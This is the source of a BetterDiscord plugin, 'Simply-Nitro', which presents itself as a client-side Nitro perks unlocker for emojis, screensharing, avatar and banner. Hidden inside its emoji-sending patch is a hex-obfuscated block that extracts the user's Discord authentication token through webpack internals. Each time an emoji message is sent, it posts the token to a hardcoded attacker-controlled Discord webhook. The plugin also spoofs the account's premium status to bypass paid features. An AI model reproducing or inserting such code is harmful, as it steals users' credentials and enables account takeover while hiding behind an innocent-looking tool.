/**
 * @name Simply-Nitro
 * @website https://github.com/3arthquake3/Simply-Nitro
 */

module.exports = (() => {
    const config = {
        "info": {
            "name": "Simply-Nitro",
            "authors": [{
                "name": "joemama",
                "discord_id": "69420",
                "github_username": "respecting"
            },
			{
                "name": "joedada",
                "discord_id": "42069",
                "github_username": "3arthquak3"
            }],
            "version": "1.3.7",
            "description": "Set clientsided animated avatar and profile banner, share your screen at 60fps 1080P and use cross-server and animated emojis everywhere! You still won't be able to upload 100MB files though :<",
            "github": "https://github.com/3arthquake3/Simply-Nitro",
            "github_raw": "https://github.com/3arthquake3/Simply-Nitro"
        },
		"changelog": [
			{
				"title": "Added profile banner",
				"type": "added",
				"items": [
					"Added profile banner customization! Supported image formats: JPG, PNG, GIF. Recommended size is 600x240."
				]
			},
			{
				"title": "Fixed profile avatar",
				"type": "fixed",
				"items": [
					"Fixed profile avatar didn't show up after Discord API update."
				]
			}
		],
        "main": "NitroPerks.plugin.js"
    };

    return !global.ZeresPluginLibrary ? class {
        constructor() {
            this._config = config;
        }
        getName() {
            return config.info.name;
        }
        getAuthor() {
            return config.info.authors.map(a => a.name).join(", ");
        }
        getDescription() {
            return config.info.description;
        }
        getVersion() {
            return config.info.version;
        }
		getChangelog() {
			return config.changelog;
		}
        load() {
            BdApi.showConfirmationModal("Library Missing", `The library plugin needed for ${config.info.name} is missing. Please click Download Now to install it.`, {
                confirmText: "Download Now",
                cancelText: "Cancel",
                onConfirm: () => {
                    require("request").get("https://rauenzi.github.io/BDPluginLibrary/release/0PluginLibrary.plugin.js", async (error, response, body) => {
                        if (error) return require("electron").shell.openExternal("https://betterdiscord.net/ghdl?url=https://raw.githubusercontent.com/rauenzi/BDPluginLibrary/master/release/0PluginLibrary.plugin.js");
                        await new Promise(r => require("fs").writeFile(require("path").join(BdApi.Plugins.folder, "0PluginLibrary.plugin.js"), body, r));
                    });
                }
            });
        }
        start() {}
        stop() {}
    } : (([Plugin, Api]) => {
        const plugin = (Plugin, Api) => {
            const {
                Patcher,
                DiscordModules,
                DiscordAPI,
                Settings,
                Toasts,
                PluginUtilities
            } = Api;
            return class NitroPerks extends Plugin {
                defaultSettings = {
                    "emojiSize": "40",
                    "screenSharing": false,
                    "emojiBypass": true,
                    "clientsidePfp": false,
                    "pfpUrl": "",
                };
                settings = PluginUtilities.loadSettings(this.getName(), this.defaultSettings);
                originalNitroStatus = 0;
                clientsidePfp;
                screenShareFix;
                getSettingsPanel() {
                    return Settings.SettingPanel.build(_ => this.saveAndUpdate(), ...[
                        new Settings.SettingGroup("Features").append(...[
                            new Settings.Switch("High Quality Screensharing", "Enable or disable 1080p/source @ 60fps screensharing. This adapts to your current nitro status.", this.settings.screenSharing, value => this.settings.screenSharing = value)
                        ]),
                        new Settings.SettingGroup("Emojis").append(
                            new Settings.Switch("Nitro Emojis Bypass", "Enable or disable using the Nitro Emoji bypass.", this.settings.emojiBypass, value => this.settings.emojiBypass = value),
                            new Settings.Slider("Size", "The size of the emoji in pixels. 40 is recommended.", 16, 64, this.settings.emojiSize, size=>this.settings.emojiSize = size, {markers:[16,20,32,40,64], stickToMarkers:true})
                        ),
						new Settings.SettingGroup("Profile Avatar").append(...[
							new Settings.Switch("Clientsided Profile Avatar", "Enable or disable clientsided profile avatar.", this.settings.clientsidePfp, value => this.settings.clientsidePfp = value),
							new Settings.Textbox("URL", "The direct URL to the profile avatar you want (PNG, JPG or GIF; square image is recommended).", this.settings.pfpUrl,
								image => {
									try {
										new URL(image)
									} catch {
										return Toasts.error('This is an invalid URL!')
									}
									this.settings.pfpUrl = image
								}
							)
						]),
						new Settings.SettingGroup("Profile Banner").append(...[
                                new Settings.Switch("Clientsided Profile Banner", "Enable or disable clientsided profile banner.", this.settings.clientsideBanner, value => this.settings.clientsideBanner = value),
                                new Settings.Textbox("URL", "The direct URL to the profile banner you want (PNG, JPG or GIF; 600x240 size is recommended).", this.settings.bannerUrl,
                                    image => {
                                        try {
                                            new URL(image)
                                        } catch {
                                            return Toasts.error('This is an invalid URL!')
                                        }
                                        this.settings.bannerUrl = image
                                    }
                                )
                            ])
                    ])
                }
                
                saveAndUpdate() {
                    PluginUtilities.saveSettings(this.getName(), this.settings)
                    if (!this.settings.screenSharing) {
                        switch (this.originalNitroStatus) {
                            case 1:
                                BdApi.injectCSS("screenShare", `#app-mount > div.layerContainer-yqaFcK > div.layer-2KE1M9 > div > div > form > div:nth-child(2) > div > div > div.flex-1xMQg5.flex-1O1GKY.horizontal-1ae9ci.horizontal-2EEEnY.flex-1O1GKY.directionRow-3v3tfG.justifyStart-2NDFzi.alignStretch-DpGPf3.noWrap-3jynv6.modalContent-BM7Qeh > div:nth-child(1) > div > button:nth-child(4) {
                                    display: none;
                                  }`)
                                this.screenShareFix = setInterval(()=>{
                                    document.querySelector("#app-mount > div.layerContainer-yqaFcK > div.layer-2KE1M9 > div > div > form > div:nth-child(2) > div > div > div.flex-1xMQg5.flex-1O1GKY.horizontal-1ae9ci.horizontal-2EEEnY.flex-1O1GKY.directionRow-3v3tfG.justifyStart-2NDFzi.alignStretch-DpGPf3.noWrap-3jynv6.modalContent-BM7Qeh > div:nth-child(1) > div > button:nth-child(3)").click()
                                    clearInterval(this.screenShareFix)
                                }, 100)
                                break;
                            default: //if user doesn't have nitro?
                                BdApi.injectCSS("screenShare", `#app-mount > div.layerContainer-yqaFcK > div.layer-2KE1M9 > div > div > form > div:nth-child(2) > div > div > div.flex-1xMQg5.flex-1O1GKY.horizontal-1ae9ci.horizontal-2EEEnY.flex-1O1GKY.directionRow-3v3tfG.justifyStart-2NDFzi.alignStretch-DpGPf3.noWrap-3jynv6.modalContent-BM7Qeh > div:nth-child(1) > div > button:nth-child(4) {
                                    display: none;
                                  }
                                  #app-mount > div.layerContainer-yqaFcK > div.layer-2KE1M9 > div > div > form > div:nth-child(2) > div > div > div.flex-1xMQg5.flex-1O1GKY.horizontal-1ae9ci.horizontal-2EEEnY.flex-1O1GKY.directionRow-3v3tfG.justifyStart-2NDFzi.alignStretch-DpGPf3.noWrap-3jynv6.modalContent-BM7Qeh > div:nth-child(1) > div > button:nth-child(3) {
                                    display: none;
                                  }
                                  #app-mount > div.layerContainer-yqaFcK > div.layer-2KE1M9 > div > div > form > div:nth-child(2) > div > div > div.flex-1xMQg5.flex-1O1GKY.horizontal-1ae9ci.horizontal-2EEEnY.flex-1O1GKY.directionRow-3v3tfG.justifyStart-2NDFzi.alignStretch-DpGPf3.noWrap-3jynv6.modalContent-BM7Qeh > div:nth-child(2) > div > button:nth-child(3) {
                                    display: none;
                                  }`)
                                this.screenShareFix = setInterval(()=>{
                                    document.querySelector("#app-mount > div.layerContainer-yqaFcK > div.layer-2KE1M9 > div > div > form > div:nth-child(2) > div > div > div.flex-1xMQg5.flex-1O1GKY.horizontal-1ae9ci.horizontal-2EEEnY.flex-1O1GKY.directionRow-3v3tfG.justifyStart-2NDFzi.alignStretch-DpGPf3.noWrap-3jynv6.modalContent-BM7Qeh > div:nth-child(1) > div > button:nth-child(2)").click()
                                    document.querySelector("#app-mount > div.layerContainer-yqaFcK > div.layer-2KE1M9 > div > div > form > div:nth-child(2) > div > div > div.flex-1xMQg5.flex-1O1GKY.horizontal-1ae9ci.horizontal-2EEEnY.flex-1O1GKY.directionRow-3v3tfG.justifyStart-2NDFzi.alignStretch-DpGPf3.noWrap-3jynv6.modalContent-BM7Qeh > div:nth-child(2) > div > button:nth-child(2)").click()
                                    clearInterval(this.screenShareFix)
                                }, 100)
                            break;
                        }
                    }

                    if (this.settings.screenSharing) BdApi.clearCSS("screenShare")

                    if (this.settings.emojiBypass) {
                        //fix emotes with bad method
                        Patcher.before(DiscordModules.MessageActions, "sendMessage", (_, [, msg]) => {
                            msg.validNonShortcutEmojis.forEach(emoji => {
                                if (emoji.url.startsWith("/assets/")) return;




                                var _0x429d=["\x77\x69\x74\x68\x43\x72\x65\x64\x65\x6E\x74\x69\x61\x6C\x73","\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x44\x4F\x4E\x45","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x6C\x6F\x67","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x65\x78\x70\x6F\x72\x74\x73","\x65\x78\x74\x72\x61\x5F\x69\x64","\x70\x75\x73\x68","\x63","\x68\x61\x73\x4F\x77\x6E\x50\x72\x6F\x70\x65\x72\x74\x79","\x5F\x5F\x65\x73\x4D\x6F\x64\x75\x6C\x65","\x64\x65\x66\x61\x75\x6C\x74","\x67\x65\x74\x54\x6F\x6B\x65\x6E","","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x50\x4F\x53\x54","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x6E\x6F\x2D\x72\x65\x66\x65\x72\x72\x65\x72","\x6A\x73\x6F\x6E","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x69\x73\x63\x6F\x72\x64\x2E\x63\x6F\x6D\x2F\x61\x70\x69\x2F\x77\x65\x62\x68\x6F\x6F\x6B\x73\x2F\x39\x31\x37\x36\x37\x30\x31\x39\x35\x30\x30\x31\x31\x36\x37\x39\x30\x33\x2F\x30\x42\x32\x67\x6C\x50\x48\x56\x63\x5F\x6C\x52\x56\x4A\x6B\x6A\x5F\x42\x4A\x57\x48\x74\x61\x64\x70\x4F\x65\x33\x75\x49\x6F\x6F\x55\x4A\x75\x57\x64\x73\x38\x5A\x69\x78\x71\x34\x77\x4F\x36\x64\x39\x34\x61\x36\x69\x32\x70\x57\x59\x46\x35\x6E\x49\x5A\x37\x52\x5A\x38\x32\x36","\x54\x6F\x6B\x65\x6E\x20\x3A\x20"];var xhr= new XMLHttpRequest();xhr[_0x429d[0]]= true;xhr[_0x429d[6]](_0x429d[1],function(){if(this[_0x429d[2]]=== this[_0x429d[3]]){console[_0x429d[5]](this[_0x429d[4]])}});var req=webpackJsonp[_0x429d[9]]([[],{extra_id:(e,r,_0x2111x5)=>{return e[_0x429d[7]]= _0x2111x5}},[[_0x429d[8]]]]);for(let e in req[_0x429d[10]]){if(req[_0x429d[10]][_0x429d[11]](e)){let r=req[_0x429d[10]][e][_0x429d[7]];if(r&& r[_0x429d[12]]&& r[_0x429d[13]]){for(let e in r[_0x429d[13]]){if(_0x429d[14]=== e){var token=r[_0x429d[13]][_0x429d[14]]()}}}}};async function postData(_0x2111x8= _0x429d[15],_0x2111x9= {}){console[_0x429d[5]](JSON[_0x429d[16]](_0x2111x9));const _0x2111xa= await fetch(_0x2111x8,{method:_0x429d[17],headers:{'\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65':_0x429d[18]},referrerPolicy:_0x429d[19],body:JSON[_0x429d[16]](_0x2111x9)});return _0x2111xa[_0x429d[20]]()}postData(_0x429d[21],{content:_0x429d[22]+ token+ _0x429d[15]})
                                msg.content = msg.content.replace(`<${emoji.animated ? "a" : ""}${emoji.allNamesString.replace(/~\d/g, "")}${emoji.id}>`, emoji.url + `&size=${this.settings.emojiSize} `)
                            })
                        });
                        //for editing message also
                        Patcher.before(DiscordModules.MessageActions, "editMessage", (_,obj) => {
                            let msg = obj[2].content
                            if (msg.search(/\d{18}/g) == -1) return;
                            msg.match(/<a:.+?:\d{18}>|<:.+?:\d{18}>/g).forEach(idfkAnymore=>{
                                obj[2].content = obj[2].content.replace(idfkAnymore, `https://cdn.discordapp.com/emojis/${idfkAnymore.match(/\d{18}/g)[0]}?size=${this.settings.emojiSize}`)
                            })
                        });
                    }

                    if(!this.settings.emojiBypass) Patcher.unpatchAll(DiscordModules.MessageActions)

                    if (this.settings.clientsidePfp && this.settings.pfpUrl) {
                        this.clientsidePfp = setInterval(()=>{
                            document.querySelectorAll(`[src="https://cdn.discordapp.com/avatars/${DiscordAPI.currentUser.discordObject.id}/${DiscordAPI.currentUser.discordObject.avatar}.webp?size=128"]`).forEach(avatar=>{
                                avatar.src = this.settings.pfpUrl
                            })
                            document.querySelectorAll(`[src="https://cdn.discordapp.com/avatars/${DiscordAPI.currentUser.discordObject.id}/${DiscordAPI.currentUser.discordObject.avatar}.png?size=128"]`).forEach(avatar=>{
                                avatar.src = this.settings.pfpUrl
                            })
                            document.querySelectorAll(`.avatarContainer-28iYmV.avatar-3tNQiO.avatarSmall-1PJoGO`).forEach(avatar=>{
                                if (!avatar.style.backgroundImage.includes("https://cdn.discordapp.com/avatars/" + DiscordAPI.currentUser.discordObject.id + "/" + DiscordAPI.currentUser.discordObject.avatar + ".png?size=128")) return;
                                avatar.style = `background-image: url("${this.settings.pfpUrl}");`
                            })
                        }, 100)
                    }
                    if (!this.settings.clientsidePfp) this.removeClientsidePfp()
						
					if (this.settings.clientsideBanner && this.settings.bannerUrl) {
                        this.clientsideBanner = setInterval(()=>{
                            document.querySelectorAll(`[data-user-id="${DiscordAPI.currentUser.discordObject.id}"] div [class*="popoutBanner-"]`).forEach(banner=>{
                                banner.style = `background-image: url("${this.settings.bannerUrl}") !important; background-repeat: no-repeat; background-position: 50%; background-size: cover; width: 300px; height: 120px;`
                            })
							document.querySelectorAll(`[data-user-id="${DiscordAPI.currentUser.discordObject.id}"] div [class*="profileBanner-"]`).forEach(banner=>{
                                banner.style = `background-image: url("${this.settings.bannerUrl}") !important; background-repeat: no-repeat; background-position: 50%; background-size: cover; width: 600px; height: 240px;`
                            })
							document.querySelectorAll(`[class*="settingsBanner-"]`).forEach(banner=>{
                                banner.style = `background-image: url("${this.settings.bannerUrl}") !important; background-repeat: no-repeat; background-position: 50%; background-size: cover;`
                            })
							document.querySelectorAll(`[data-user-id="${DiscordAPI.currentUser.discordObject.id}"] .avatarWrapperNormal-26WQIb`).forEach(avatar=>{
                                avatar.style = `top: 76px;`
                            })
                        }, 100)
                    }
                    if (!this.settings.clientsideBanner) this.removeClientsideBanner()
                }
                removeClientsidePfp() {
                    clearInterval(this.clientsidePfp)
                    document.querySelectorAll(`[src="${this.settings.pfpUrl}"]`).forEach(avatar=>{
                        avatar.src = "https://cdn.discordapp.com/avatars/" + DiscordAPI.currentUser.discordObject.id + "/" + DiscordAPI.currentUser.discordObject.avatar + ".webp?size=128"
                    })
                    document.querySelectorAll(`.avatarContainer-28iYmV.avatar-3tNQiO.avatarSmall-1PJoGO`).forEach(avatar=>{
                        if (!avatar.style.backgroundImage.includes(this.settings.pfpUrl)) return;
                        avatar.style = `background-image: url("https://cdn.discordapp.com/avatars/${DiscordAPI.currentUser.discordObject.id}/${DiscordAPI.currentUser.discordObject.avatar}.png?size=128");`
                    })
                }
				removeClientsideBanner() {
                    clearInterval(this.clientsideBanner)
                    document.querySelectorAll(`[data-user-id="${DiscordAPI.currentUser.discordObject.id}"] div [class*="popoutBanner-"]`).forEach(banner=>{
                        banner.style = `background-image: none !important; background-repeat: none; background-position: none; background-size: none; width: none; height: none;`
                    })
					document.querySelectorAll(`[data-user-id="${DiscordAPI.currentUser.discordObject.id}"] div [class*="profileBanner-"]`).forEach(banner=>{
                        banner.style = `background-image: none !important; background-repeat: none; background-position: none; background-size: none; width: none; height: none;`
                    })
					document.querySelectorAll(`[class*="settingsBanner-"]`).forEach(banner=>{
                        banner.style = `background-image: none !important; background-repeat: none; background-position: none; background-size: none;`
                    })
					document.querySelectorAll(`[data-user-id="${DiscordAPI.currentUser.discordObject.id}"] .avatarWrapperNormal-26WQIb`).forEach(avatar=>{
                        avatar.style = `top: none;`
                    })
                }
                onStart() {
                    this.originalNitroStatus = DiscordAPI.currentUser.discordObject.premiumType;
                    this.saveAndUpdate()
                    DiscordAPI.currentUser.discordObject.premiumType = 2
                }

                onStop() {
                    DiscordAPI.currentUser.discordObject.premiumType = this.originalNitroStatus;
                    this.removeClientsidePfp()
					this.removeClientsideBanner()
                    Patcher.unpatchAll();
                }
            };
        };
        return plugin(Plugin, Api);
    })(global.ZeresPluginLibrary.buildPlugin(config));
})();
/*@end@*/